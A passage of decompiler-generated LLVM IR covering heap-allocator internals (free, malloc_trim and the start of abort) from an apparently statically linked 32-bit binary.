  %v1_80543fb = phi i32 [ %v3_80543e2, %dec_label_pc_80543ef ], [ %v1_80543fb.pre, %dec_label_pc_80543f4 ]
  %v0_80543fb = phi i32 [ %v3_80543e5, %dec_label_pc_80543ef ], [ %v0_80543f4, %dec_label_pc_80543f4 ]
  %v0_80543f9 = load i32, i32* @edi, align 4
  %v1_80543f9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80543f9 = add i32 %v1_80543f9, %v0_80543f9
  store i32 %v2_80543f9, i32* @edi, align 4
  %v2_80543fb = add i32 %v1_80543fb, 12
  %v3_80543fb = inttoptr i32 %v2_80543fb to i32*
  store i32 %v0_80543fb, i32* %v3_80543fb, align 4
  %v0_80543fe = load i32, i32* @edx, align 4
  %v1_80543fe = load i32, i32* %eax.global-to-local, align 4
  %v2_80543fe = add i32 %v1_80543fe, 8
  %v3_80543fe = inttoptr i32 %v2_80543fe to i32*
  store i32 %v0_80543fe, i32* %v3_80543fe, align 4
  br label %dec_label_pc_8054401

dec_label_pc_8054401:                             ; preds = %dec_label_pc_80543d4, %dec_label_pc_80543f9
  store i32 %v1_805434c, i32* %eax.global-to-local, align 4
  %v3_8054405 = load i32, i32* %v2_8054405, align 4
  store i32 %v3_8054405, i32* @edx, align 4
  %v0_8054408 = load i32, i32* @ecx, align 4
  store i32 %v0_8054408, i32* %v2_8054405, align 4
  %v0_805440b = load i32, i32* @edi, align 4
  %v1_805440d = or i32 %v0_805440b, 1
  %v1_8054410 = load i32, i32* @ecx, align 4
  %v2_8054410 = add i32 %v1_8054410, 4
  %v3_8054410 = inttoptr i32 %v2_8054410 to i32*
  store i32 %v1_805440d, i32* %v3_8054410, align 4
  %v0_8054413 = load i32, i32* @ecx, align 4
  %v1_8054413 = load i32, i32* @edx, align 4
  %v2_8054413 = add i32 %v1_8054413, 12
  %v3_8054413 = inttoptr i32 %v2_8054413 to i32*
  store i32 %v0_8054413, i32* %v3_8054413, align 4
  store i32 %v1_805434c, i32* %eax.global-to-local, align 4
  %v0_805441a = load i32, i32* @edx, align 4
  %v1_805441a = load i32, i32* @ecx, align 4
  %v2_805441a = add i32 %v1_805441a, 8
  %v3_805441a = inttoptr i32 %v2_805441a to i32*
  store i32 %v0_805441a, i32* %v3_805441a, align 4
  %v0_805441d = load i32, i32* @edi, align 4
  %v1_805441d = load i32, i32* @ecx, align 4
  %v3_805441d = add i32 %v1_805441d, %v0_805441d
  %v4_805441d = inttoptr i32 %v3_805441d to i32*
  store i32 %v0_805441d, i32* %v4_805441d, align 4
  %v0_8054420 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054420 = load i32, i32* @ecx, align 4
  %v2_8054420 = add i32 %v1_8054420, 12
  %v3_8054420 = inttoptr i32 %v2_8054420 to i32*
  store i32 %v0_8054420, i32* %v3_8054420, align 4
  br label %dec_label_pc_8054435

dec_label_pc_8054425:                             ; preds = %dec_label_pc_80543c4
  %v0_8054425 = load i32, i32* @edi, align 4
  %v2_8054425 = add i32 %v0_8054425, %v1_80543cc
  %v1_8054428 = or i32 %v2_8054425, 1
  store i32 %v1_8054428, i32* %eax.global-to-local, align 4
  %v1_805442b = load i32, i32* @ecx, align 4
  %v2_805442b = add i32 %v1_805442b, 4
  %v3_805442b = inttoptr i32 %v2_805442b to i32*
  store i32 %v1_8054428, i32* %v3_805442b, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8054432 = load i32, i32* @ecx, align 4
  store i32 %v0_8054432, i32* %v3_8054432, align 4
  br label %dec_label_pc_8054435

dec_label_pc_8054435:                             ; preds = %dec_label_pc_8054401, %dec_label_pc_8054425
  store i32 %v3_8054387, i32* @ecx, align 4
  %v1_8054439 = icmp eq i32 %v3_8054387, 0
  %v1_805443b = icmp eq i1 %v1_8054439, false
  br i1 %v1_805443b, label %dec_label_pc_8054387, label %dec_label_pc_8054441

dec_label_pc_8054441:                             ; preds = %dec_label_pc_8054435, %dec_label_pc_8054373
  store i32 %v4_805436b, i32* @ecx, align 4
  %v15_8054445 = icmp eq i32 %v0_8054381, %v4_805436b
  br i1 %v15_8054445, label %dec_label_pc_80544c9, label %dec_label_pc_805444b

dec_label_pc_805444b:                             ; preds = %dec_label_pc_8054441
  %v4_805444b = add i32 %v0_8054381, 4
  br label %dec_label_pc_8054373

dec_label_pc_8054455:                             ; preds = %dec_label_pc_8054464.preheader, %dec_label_pc_8054455
  %v1_805445920 = phi i32 [ 1, %dec_label_pc_8054464.preheader ], [ %v0_8054464.pre, %dec_label_pc_8054455 ]
  %v2_8054459 = mul i32 %v1_805445920, 8
  %v4_8054459 = add i32 %v3_8054459, %v2_8054459
  store i32 %v4_8054459, i32* %eax.global-to-local, align 4
  %v1_805445d = add i32 %v1_805445920, 1
  store i32 %v1_805445d, i32* %edx.global-to-local, align 4
  %v2_805445e = add i32 %v4_8054459, 12
  %v3_805445e = inttoptr i32 %v2_805445e to i32*
  store i32 %v4_8054459, i32* %v3_805445e, align 4
  %v0_8054461 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054461 = add i32 %v0_8054461, 8
  %v3_8054461 = inttoptr i32 %v2_8054461 to i32*
  store i32 %v0_8054461, i32* %v3_8054461, align 4
  %v0_8054464.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8054467 = icmp sgt i32 %v0_8054464.pre, 95
  br i1 %v7_8054467, label %dec_label_pc_8054469, label %dec_label_pc_8054455

dec_label_pc_8054469:                             ; preds = %dec_label_pc_8054455
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805446d = add i32 %tmp11, 864
  %v2_805446d = inttoptr i32 %v1_805446d to i32*
  %v3_805446d = load i32, i32* %v2_805446d, align 4
  %v4_805446d = or i32 %v3_805446d, 1
  store i32 %v4_805446d, i32* %v2_805446d, align 4
  %v0_8054474 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054474 = add i32 %v0_8054474, 840
  %v2_8054474 = inttoptr i32 %v1_8054474 to i32*
  store i32 0, i32* %v2_8054474, align 4
  %v0_805447e = load i32, i32* %eax.global-to-local, align 4
  %v1_805447e = add i32 %v0_805447e, 852
  %v2_805447e = inttoptr i32 %v1_805447e to i32*
  store i32 65536, i32* %v2_805447e, align 4
  %v0_8054488 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054488 = add i32 %v0_8054488, 844
  %v2_8054488 = inttoptr i32 %v1_8054488 to i32*
  store i32 262144, i32* %v2_8054488, align 4
  %v0_8054492 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054492 = add i32 %v0_8054492, 836
  %v2_8054492 = inttoptr i32 %v1_8054492 to i32*
  store i32 262144, i32* %v2_8054492, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_80544a3 = load i32, i32* %arg1, align 4
  %v1_80544a5 = urem i32 %v2_80544a3, 4
  %v1_80544a8 = or i32 %v1_80544a5, 72
  store i32 %v1_80544a8, i32* %arg1, align 4
  %v0_80544ad = load i32, i32* @edx, align 4
  %v1_80544af = add i32 %v0_80544ad, 52
  store i32 %v1_80544af, i32* %eax.global-to-local, align 4
  %v2_80544b2 = add i32 %v0_80544ad, 44
  %v3_80544b2 = inttoptr i32 %v2_80544b2 to i32*
  store i32 %v1_80544af, i32* %v3_80544b2, align 4
  %v1_80544b7 = call i32 @sysconf(i32 30)
  store i32 %v1_80544b7, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80544c3 = add i32 %tmp11, 860
  %v3_80544c3 = inttoptr i32 %v2_80544c3 to i32*
  store i32 %v1_80544b7, i32* %v3_80544c3, align 4
  br label %dec_label_pc_80544c9

dec_label_pc_80544c9:                             ; preds = %dec_label_pc_8054441, %dec_label_pc_8054469
  store i32 %v0_805432c, i32* @ebx, align 4
  store i32 %v0_805432b, i32* @esi, align 4
  store i32 %v0_805432a, i32* @edi, align 4
  %v0_80544d0 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80544d0

; uselistorder directives
  uselistorder i32 %v0_8054461, { 1, 0 }
  uselistorder i32 %v0_805441d, { 1, 0 }
  uselistorder i32 %v1_80543db, { 1, 0 }
  uselistorder i32 %v2_80543d4, { 1, 0 }
  uselistorder i32 %v1_80543cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80543d8, { 1, 0 }
  uselistorder i32 %v3_8054387, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80543a4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8054381, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8054432, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80544c9, { 1, 0 }
  uselistorder label %dec_label_pc_8054455, { 1, 0 }
  uselistorder label %dec_label_pc_8054435, { 1, 0 }
  uselistorder label %dec_label_pc_8054401, { 1, 0 }
  uselistorder label %dec_label_pc_80543f9, { 1, 0 }
  uselistorder label %dec_label_pc_80543c4, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80544d1 = load i32, i32* @ebp, align 4
  %v0_80544d2 = load i32, i32* @edi, align 4
  %v0_80544d3 = load i32, i32* @esi, align 4
  %v0_80544d4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80544dc = icmp eq i32 %arg1, 0
  br i1 %v1_80544dc, label %dec_label_pc_8054665, label %dec_label_pc_80544e4

dec_label_pc_80544e4:                             ; preds = %entry
  %v2_80544ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80544ef, i32* @eax, align 4
  %v2_80544f4 = call i32 @__pthread_return_void(i32 %v2_80544ef, i32 134566343)
  store i32 %v2_80544f4, i32* %eax.global-to-local, align 4
  %v1_8054500 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3d0.501 to i32))
  %v1_8054505 = add i32 %arg1, -8
  store i32 %v1_8054505, i32* @ecx, align 4
  %v0_8054508 = load i8, i8* @global_var_8062840.502, align 1
  %v1_8054508 = sext i8 %v0_8054508 to i32
  store i32 %v1_8054508, i32* %eax.global-to-local, align 4
  %v1_805450d = add i32 %arg1, -4
  %v2_805450d = inttoptr i32 %v1_805450d to i32*
  %v3_805450d = load i32, i32* %v2_805450d, align 4
  store i32 %v3_805450d, i32* @edx, align 4
  %v1_8054515 = and i32 %v3_805450d, -4
  %v4_8054515 = trunc i32 %v1_8054515 to i8
  store i32 %v1_8054515, i32* @ebx, align 4
  %v8_805451a = icmp ugt i8 %v4_8054515, %v0_8054508
  br i1 %v8_805451a, label %dec_label_pc_805453c, label %dec_label_pc_805451c

dec_label_pc_805451c:                             ; preds = %dec_label_pc_80544e4
  %v1_805451c = or i32 %v1_8054508, 3
  %v3_805451c = trunc i32 %v1_805451c to i8
  store i32 %v1_805451c, i32* %eax.global-to-local, align 4
  %v2_805451f = udiv i32 %v3_805450d, 8
  store i8 %v3_805451c, i8* @global_var_8062840.502, align 64
  %v1_8054527 = mul nuw i32 %v2_805451f, 4
  %v2_8054527 = add i32 %v1_8054527, ptrtoint (i8* @global_var_8062840.502 to i32)
  store i32 %v2_8054527, i32* @edx, align 4
  %v1_805452e = add i32 %v1_8054527, add (i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32 -4)
  %v2_805452e = inttoptr i32 %v1_805452e to i32*
  %v3_805452e = load i32, i32* %v2_805452e, align 4
  store i32 %v3_805452e, i32* %eax.global-to-local, align 4
  %v3_8054531 = inttoptr i32 %arg1 to i32*
  store i32 %v3_805452e, i32* %v3_8054531, align 4
  %v0_8054534 = load i32, i32* @ecx, align 4
  %v1_8054534 = load i32, i32* @edx, align 4
  %v2_8054534 = add i32 %v1_8054534, -4
  %v3_8054534 = inttoptr i32 %v2_8054534 to i32*
  store i32 %v0_8054534, i32* %v3_8054534, align 4
  br label %dec_label_pc_8054654

dec_label_pc_805453c:                             ; preds = %dec_label_pc_80544e4
  %v2_805453c = and i32 %v3_805450d, 2
  %v3_805453c = icmp eq i32 %v2_805453c, 0
  %v1_805453f = icmp eq i1 %v3_805453c, false
  br i1 %v1_805453f, label %dec_label_pc_8054634, label %dec_label_pc_8054545

dec_label_pc_8054545:                             ; preds = %dec_label_pc_805453c
  %v1_8054545 = or i32 %v1_8054508, 1
  %v3_8054545 = trunc i32 %v1_8054545 to i8
  store i32 %v1_8054545, i32* %eax.global-to-local, align 4
  store i8 %v3_8054545, i8* @global_var_8062840.502, align 64
  %v2_805454d = add i32 %v1_8054515, %v1_8054505
  store i32 %v2_805454d, i32* @esi, align 4
  %v1_8054550 = add i32 %v2_805454d, 4
  %v2_8054550 = inttoptr i32 %v1_8054550 to i32*
  %v3_8054550 = load i32, i32* %v2_8054550, align 4
  store i32 %v3_8054550, i32* %eax.global-to-local, align 4
  %v2_8054557 = inttoptr i32 %v1_805450d to i8*
  %v3_8054557 = load i8, i8* %v2_8054557, align 1
  %v4_8054557 = urem i8 %v3_8054557, 2
  %v5_8054557 = icmp eq i8 %v4_8054557, 0
  %v1_805455b = icmp eq i1 %v5_8054557, false
  br i1 %v1_805455b, label %dec_label_pc_805457e, label %dec_label_pc_805455d

dec_label_pc_805455d:                             ; preds = %dec_label_pc_8054545
  %v2_805455d = inttoptr i32 %v1_8054505 to i32*
  %v3_805455d = load i32, i32* %v2_805455d, align 4
  store i32 %v3_805455d, i32* @ebp, align 4
  %v2_8054562 = sub i32 %v1_8054505, %v3_805455d
  store i32 %v2_8054562, i32* %eax.global-to-local, align 4
  %v1_8054564 = add i32 %v2_8054562, 8
  %v2_8054564 = inttoptr i32 %v1_8054564 to i32*
  %v3_8054564 = load i32, i32* %v2_8054564, align 4
  store i32 %v3_8054564, i32* @edi, align 4
  %v1_8054567 = add i32 %v2_8054562, 12
  %v2_8054567 = inttoptr i32 %v1_8054567 to i32*
  %v3_8054567 = load i32, i32* %v2_8054567, align 4
  store i32 %v3_8054567, i32* @edx, align 4
  %v1_805456a = add i32 %v3_8054564, 12
  %v2_805456a = inttoptr i32 %v1_805456a to i32*
  %v3_805456a = load i32, i32* %v2_805456a, align 4
  store i32 %v3_805456a, i32* @ecx, align 4
  %v12_805456d = icmp eq i32 %v3_805456a, %v2_8054562
  %v1_805456f = icmp eq i1 %v12_805456d, false
  br i1 %v1_805456f, label %dec_label_pc_80545ad, label %dec_label_pc_8054571

dec_label_pc_8054571:                             ; preds = %dec_label_pc_805455d
  %v1_8054571 = add i32 %v3_8054567, 8
  %v2_8054571 = inttoptr i32 %v1_8054571 to i32*
  %v3_8054571 = load i32, i32* %v2_8054571, align 4
  %v15_8054571 = icmp eq i32 %v3_8054571, %v3_805456a
  %v1_8054574 = icmp eq i1 %v15_8054571, false
  br i1 %v1_8054574, label %dec_label_pc_80545ad, label %dec_label_pc_8054576

dec_label_pc_8054576:                             ; preds = %dec_label_pc_8054571
  %v2_8054576 = add i32 %v3_805455d, %v1_8054515
  store i32 %v2_8054576, i32* @ebx, align 4
  store i32 %v3_8054567, i32* %v2_805456a, align 4
  %v0_805457b = load i32, i32* @edi, align 4
  %v1_805457b = load i32, i32* @edx, align 4
  %v2_805457b = add i32 %v1_805457b, 8
  %v3_805457b = inttoptr i32 %v2_805457b to i32*
  store i32 %v0_805457b, i32* %v3_805457b, align 4
  %v0_8054585.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805457e

dec_label_pc_805457e:                             ; preds = %dec_label_pc_8054545, %dec_label_pc_8054576
  %v1_8054591 = phi i32 [ %v2_805454d, %dec_label_pc_8054545 ], [ %v0_8054585.pre, %dec_label_pc_8054576 ]
  %v1_8054582 = and i32 %v3_8054550, -4
  store i32 %v1_8054582, i32* @ebp, align 4
  %v1_8054585 = load i32, i32* @global_var_806286c.503, align 4
  %v12_8054585 = icmp eq i32 %v1_8054591, %v1_8054585
  br i1 %v12_8054585, label %dec_label_pc_80545df, label %dec_label_pc_805458d

dec_label_pc_805458d:                             ; preds = %dec_label_pc_805457e
  %v2_805458d = add i32 %v1_8054591, 4
  %v3_805458d = add i32 %v2_805458d, %v1_8054582
  %v4_805458d = inttoptr i32 %v3_805458d to i32*
  %v5_805458d = load i32, i32* %v4_805458d, align 4
  store i32 %v5_805458d, i32* %eax.global-to-local, align 4
  %v3_8054591 = inttoptr i32 %v2_805458d to i32*
  store i32 %v1_8054582, i32* %v3_8054591, align 4
  %v0_8054594 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054594 = urem i32 %v0_8054594, 2
  %v2_8054594 = icmp eq i32 %v1_8054594, 0
  store i32 %v1_8054594, i32* %eax.global-to-local, align 4
  %v1_8054599 = icmp eq i1 %v2_8054594, false
  br i1 %v1_8054599, label %dec_label_pc_80545ba, label %dec_label_pc_805459b

dec_label_pc_805459b:                             ; preds = %dec_label_pc_805458d
  %v0_805459b = load i32, i32* @esi, align 4
  %v1_805459b = add i32 %v0_805459b, 8
  %v2_805459b = inttoptr i32 %v1_805459b to i32*
  %v3_805459b = load i32, i32* %v2_805459b, align 4
  store i32 %v3_805459b, i32* @edx, align 4
  %v1_805459e = add i32 %v0_805459b, 12
  %v2_805459e = inttoptr i32 %v1_805459e to i32*
  %v3_805459e = load i32, i32* %v2_805459e, align 4
  store i32 %v3_805459e, i32* %eax.global-to-local, align 4
  %v1_80545a1 = add i32 %v3_805459b, 12
  %v2_80545a1 = inttoptr i32 %v1_80545a1 to i32*
  %v3_80545a1 = load i32, i32* %v2_80545a1, align 4
  store i32 %v3_80545a1, i32* @edi, align 4
  %v12_80545a4 = icmp eq i32 %v3_80545a1, %v0_805459b
  %v1_80545a6 = icmp eq i1 %v12_80545a4, false
  br i1 %v1_80545a6, label %dec_label_pc_80545ad, label %dec_label_pc_80545a8

dec_label_pc_80545a8:                             ; preds = %dec_label_pc_805459b
  %v1_80545a8 = add i32 %v3_805459e, 8
  %v2_80545a8 = inttoptr i32 %v1_80545a8 to i32*
  %v3_80545a8 = load i32, i32* %v2_80545a8, align 4
  %v15_80545a8 = icmp eq i32 %v3_80545a8, %v3_80545a1
  br i1 %v15_80545a8, label %dec_label_pc_80545b2, label %dec_label_pc_80545ad

dec_label_pc_80545ad:                             ; preds = %dec_label_pc_80545a8, %dec_label_pc_805459b, %dec_label_pc_8054571, %dec_label_pc_805455d
  %v0_80545ad = call i32 @abort()
  store i32 %v0_80545ad, i32* %eax.global-to-local, align 4
  %v1_80545b2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80545b2

dec_label_pc_80545b2:                             ; preds = %dec_label_pc_80545a8, %dec_label_pc_80545ad
  %v1_80545b2 = phi i32 [ %v3_805459b, %dec_label_pc_80545a8 ], [ %v1_80545b2.pre, %dec_label_pc_80545ad ]
  %v0_80545b2 = phi i32 [ %v3_805459e, %dec_label_pc_80545a8 ], [ %v0_80545ad, %dec_label_pc_80545ad ]
  %v2_80545b2 = add i32 %v1_80545b2, 12
  %v3_80545b2 = inttoptr i32 %v2_80545b2 to i32*
  store i32 %v0_80545b2, i32* %v3_80545b2, align 4
  %v0_80545b5 = load i32, i32* @ebx, align 4
  %v1_80545b5 = load i32, i32* @ebp, align 4
  %v2_80545b5 = add i32 %v1_80545b5, %v0_80545b5
  store i32 %v2_80545b5, i32* @ebx, align 4
  %v0_80545b7 = load i32, i32* @edx, align 4
  %v1_80545b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80545b7 = add i32 %v1_80545b7, 8
  %v3_80545b7 = inttoptr i32 %v2_80545b7 to i32*
  store i32 %v0_80545b7, i32* %v3_80545b7, align 4
  br label %dec_label_pc_80545ba

dec_label_pc_80545ba:                             ; preds = %dec_label_pc_805458d, %dec_label_pc_80545b2
  %v0_80545ba = load i32, i32* @global_var_806287c.521, align 4
  store i32 %v0_80545ba, i32* %eax.global-to-local, align 4
  %v0_80545bf = load i32, i32* @ecx, align 4
  %v1_80545bf = add i32 %v0_80545bf, 12
  %v2_80545bf = inttoptr i32 %v1_80545bf to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_80545bf, align 4
  %v0_80545c6 = load i32, i32* @ebx, align 4
  %v1_80545c6 = load i32, i32* @ecx, align 4
  %v3_80545c6 = add i32 %v1_80545c6, %v0_80545c6
  %v4_80545c6 = inttoptr i32 %v3_80545c6 to i32*
  store i32 %v0_80545c6, i32* %v4_80545c6, align 4
  %v0_80545c9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545c9 = load i32, i32* @ecx, align 4
  %v2_80545c9 = add i32 %v1_80545c9, 8
  %v3_80545c9 = inttoptr i32 %v2_80545c9 to i32*
  store i32 %v0_80545c9, i32* %v3_80545c9, align 4
  %v0_80545cc = load i32, i32* @ecx, align 4
  %v1_80545cc = load i32, i32* %eax.global-to-local, align 4
  %v2_80545cc = add i32 %v1_80545cc, 12
  %v3_80545cc = inttoptr i32 %v2_80545cc to i32*
  store i32 %v0_80545cc, i32* %v3_80545cc, align 4
  %v0_80545cf = load i32, i32* @ebx, align 4
  %v1_80545d1 = or i32 %v0_80545cf, 1
  store i32 %v1_80545d1, i32* %eax.global-to-local, align 4
  %v0_80545d4 = load i32, i32* @ecx, align 4
  store i32 %v0_80545d4, i32* @global_var_806287c.521, align 4
  %v2_80545da = add i32 %v0_80545d4, 4
  %v3_80545da = inttoptr i32 %v2_80545da to i32*
  store i32 %v1_80545d1, i32* %v3_80545da, align 4
  br label %dec_label_pc_80545ef

dec_label_pc_80545df:                             ; preds = %dec_label_pc_805457e
  %v0_80545df = load i32, i32* @ebx, align 4
  %v2_80545df = add i32 %v0_80545df, %v1_8054582
  store i32 %v2_80545df, i32* @ebx, align 4
  %v1_80545e3 = or i32 %v2_80545df, 1
  store i32 %v1_80545e3, i32* %eax.global-to-local, align 4
  %v1_80545e6 = load i32, i32* @ecx, align 4
  %v2_80545e6 = add i32 %v1_80545e6, 4
  %v3_80545e6 = inttoptr i32 %v2_80545e6 to i32*
  store i32 %v1_80545e3, i32* %v3_80545e6, align 4
  %v0_80545e9 = load i32, i32* @ecx, align 4
  store i32 %v0_80545e9, i32* @global_var_806286c.503, align 4
  br label %dec_label_pc_80545ef

dec_label_pc_80545ef:                             ; preds = %dec_label_pc_80545ba, %dec_label_pc_80545df
  %v0_80545ef = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80545ef, 131072
  br i1 %tmp, label %dec_label_pc_8054654, label %dec_label_pc_80545f7

dec_label_pc_80545f7:                             ; preds = %dec_label_pc_80545ef
  %v0_80545f7 = load i8, i8* @global_var_8062840.502, align 64
  %v1_80545f7 = and i8 %v0_80545f7, 2
  %v2_80545f7 = icmp eq i8 %v1_80545f7, 0
  br i1 %v2_80545f7, label %dec_label_pc_8054610, label %dec_label_pc_8054600

dec_label_pc_8054600:                             ; preds = %dec_label_pc_80545f7
  %v2_8054608 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8062840.502 to i32*))
  store i32 %v2_8054608, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054610

dec_label_pc_8054610:                             ; preds = %dec_label_pc_80545f7, %dec_label_pc_8054600
  %v0_8054610 = load i32, i32* @global_var_806286c.503, align 4
  store i32 %v0_8054610, i32* %eax.global-to-local, align 4
  %v1_8054615 = add i32 %v0_8054610, 4
  %v2_8054615 = inttoptr i32 %v1_8054615 to i32*
  %v3_8054615 = load i32, i32* %v2_8054615, align 4
  %v1_8054618 = and i32 %v3_8054615, -4
  store i32 %v1_8054618, i32* %eax.global-to-local, align 4
  %v1_805461b = load i32, i32* @global_var_8062b84.519, align 4
  %v7_805461b = icmp ult i32 %v1_8054618, %v1_805461b
  br i1 %v7_805461b, label %dec_label_pc_8054654, label %dec_label_pc_8054623

dec_label_pc_8054623:                             ; preds = %dec_label_pc_8054610
  %v0_8054623 = load i32, i32* @global_var_8062b88.517, align 8
  store i32 %v0_8054623, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* @edx, align 4
  %v0_805462d = call i32 @__malloc_trim()
  store i32 %v0_805462d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054654

dec_label_pc_8054634:                             ; preds = %dec_label_pc_805453c
  %v2_8054634 = inttoptr i32 %v1_8054505 to i32*
  %v3_8054634 = load i32, i32* %v2_8054634, align 4
  %v0_8054637 = load i32, i32* @global_var_8062b90.510, align 16
  %v1_8054637 = add i32 %v0_8054637, -1
  store i32 %v1_8054637, i32* @global_var_8062b90.510, align 16
  %v2_805463d = add i32 %v3_8054634, %v1_8054515
  store i32 %v2_805463d, i32* %eax.global-to-local, align 4
  %v2_8054640 = sub i32 %v1_8054505, %v3_8054634
  %v0_8054646 = load i32, i32* @global_var_8062ba4.514, align 4
  %v2_8054646 = sub i32 %v0_8054646, %v2_805463d
  store i32 %v2_8054646, i32* @global_var_8062ba4.514, align 4
  %v4_805464c = call i32 @munmap(i32 %v2_8054640, i32 %v2_805463d, i32 %v1_8054515, i32 %v1_8054515)
  store i32 %v4_805464c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054654

dec_label_pc_8054654:                             ; preds = %dec_label_pc_8054610, %dec_label_pc_80545ef, %dec_label_pc_8054623, %dec_label_pc_805451c, %dec_label_pc_8054634
  store i32 %v2_80544ef, i32* @eax, align 4
  %v2_805465d = call i32 @__pthread_return_void(i32 %v2_80544ef, i32 1)
  store i32 %v2_805465d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054665

dec_label_pc_8054665:                             ; preds = %entry, %dec_label_pc_8054654
  %.0 = phi i32 [ undef, %entry ], [ %v2_805465d, %dec_label_pc_8054654 ]
  store i32 %v0_80544d4, i32* @ebx, align 4
  store i32 %v0_80544d3, i32* @esi, align 4
  store i32 %v0_80544d2, i32* @edi, align 4
  store i32 %v0_80544d1, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8054634, { 1, 0 }
  uselistorder i32 %v0_80545c6, { 1, 0 }
  uselistorder i32 %v1_8054594, { 1, 0 }
  uselistorder i32 %v2_805458d, { 1, 0 }
  uselistorder i32 %v1_8054582, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054591, { 1, 0 }
  uselistorder i32 %v1_8054515, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_805450d, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8054505, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder i32* bitcast (i8* @global_var_8062840.502 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8062874.505 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_806286c.503, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805c3d0.501 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8054665, { 1, 0 }
  uselistorder label %dec_label_pc_8054654, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054610, { 1, 0 }
  uselistorder label %dec_label_pc_80545ef, { 1, 0 }
  uselistorder label %dec_label_pc_80545ba, { 1, 0 }
  uselistorder label %dec_label_pc_80545b2, { 1, 0 }
  uselistorder label %dec_label_pc_805457e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805466d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805467a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8062840.502 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* @edx, align 4
  %v0_8054687 = load i32, i32* @ebx, align 4
  store i32 %v0_8054687, i32* @eax, align 4
  store i32 %v0_805466d, i32* @ebx, align 4
  %v0_805468a = call i32 @__malloc_trim()
  ret i32 %v0_805468a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8062840.502 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8062840.502, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805469c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3e8.522 to i32))
  %v12_80546a6 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546ab

dec_label_pc_80546ab:                             ; preds = %dec_label_pc_80546ab.dec_label_pc_80546ab_crit_edge, %entry
  %v0_80546ab = phi i32 [ %v12_80546a6, %entry ], [ %v0_80546ab.pre, %dec_label_pc_80546ab.dec_label_pc_80546ab_crit_edge ]
  %v1_80546b619 = phi i32 [ 31, %entry ], [ %v1_80546b6, %dec_label_pc_80546ab.dec_label_pc_80546ab_crit_edge ]
